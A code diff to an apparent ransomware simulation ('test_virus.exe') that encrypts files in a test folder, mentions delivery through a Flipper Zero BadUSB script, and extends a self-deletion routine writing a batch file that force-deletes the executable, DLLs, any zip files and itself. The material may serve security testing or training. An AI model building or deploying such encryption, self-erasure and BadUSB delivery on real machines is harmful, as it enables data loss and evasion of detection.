@@ -13,6 +13,7 @@ import base64
 from math import floor
 from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
+# import glob
 
 
 #Configurable Variables
@@ -26,8 +27,10 @@ heartbeatRate = PLACEHOLDER_HEARTBEAT_RATE  # in seconds
 encryption_key = Fernet.generate_key()
 cipher_suite = Fernet(encryption_key)
 
-# Directory and file configuration
-test_directory = "ransomware_test"
+# Directory and file configuration, testing with hardcoded path, 
+# if run with flipper zero badusb script it saves to the user path instead of the test folder
+# test_directory = "ransomware_test"
+test_directory = "C:\\TestVirusPath\\ransomware_test"
 file_count = 200
 file_prefix = "test_file_"
 file_extension = ".txt"
@@ -109,7 +112,7 @@ def delete_self():
         lib_folder = os.path.join(base_directory, "Lib")
         exe_file = os.path.join(base_directory, "test_virus.exe")
         license_file = os.path.join(base_directory, "frozen_application_license.txt")
-        dll_file = os.path.join(base_directory, "python312.dll")
+        dll_file = os.path.join(base_directory, "python*.dll")
         cleanup_batch = os.path.join(base_directory, "cleanup.bat")
 
         # Write a cleanup batch script
@@ -122,8 +125,11 @@ def delete_self():
                 batch_file.write(f'rmdir /s /q "{lib_folder}"\n')  # Delete folder
             if os.path.exists(license_file):
                 batch_file.write(f'del /f /q "{license_file}"\n')  # Delete license file
-            if os.path.exists(dll_file):
-                batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
+            
+            batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
+            batch_file.write(f'del /f /q "*zip"\n')  # Delete the zip file if present
+            # if os.path.exists(dll_file):
+            #     batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
             batch_file.write(f'del /f /q "{exe_file}"\n')  # Delete the EXE
             batch_file.write(f'del /f /q "{cleanup_batch}"\n')  # Delete the batch script itself
         # Log the cleanup action
